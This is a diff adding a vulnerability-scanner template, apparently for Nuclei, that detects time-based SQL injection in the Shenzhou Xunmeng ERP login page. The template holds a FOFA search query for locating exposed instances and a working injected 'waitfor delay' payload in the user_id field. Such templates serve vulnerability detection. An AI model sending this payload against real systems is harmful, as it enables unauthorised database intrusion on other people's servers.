@@ -1,0 +1,35 @@
+id: szxm-erp-login_confirm-sqli
+
+info:
+  name: 神舟讯盟ERP login_confirm.jsp - SQL Injection (Time-Based)
+  author: HuanXiong
+  severity: high
+  description: 神州讯盟ERP系统 login_confirm.jsp 存在时间盲注漏洞（SQL Server）
+  tags: szxm, sqli, mssql
+  metadata:
+    fofa-query: title="神州讯盟芯管家"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /login_confirm.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+        Referer: {{Hostname}}
+        Cookie: JSESSIONID=aaaeehfWNHF_uV
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip,deflate
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+        Connection: Keep-alive
+        Content-Length: 271
+
+        macadress=1&password=g00dPa%24%24w0rD&sn=8&url=/SunmoIC/698D51A19D8A121CE581499D7B701668.jsp&url2=/SunmoIC/698D51A19D8A121CE581499D7B701668.jsp&user_id=hUvn8soT%27%3Bwaitfor%20delay%20%270%3A0%3A2%27%20--%20&version=%E4%B8%AD%E6%96%87&wm_types=%E6%A8%A1%E6%80%81%E7%AA%97%E5%8F%A3
+
+    matchers:
+      - type: dsl
+        name: SQL
+        dsl:
+          - "status_code_1 == 200 && duration>=4 && duration<=8"
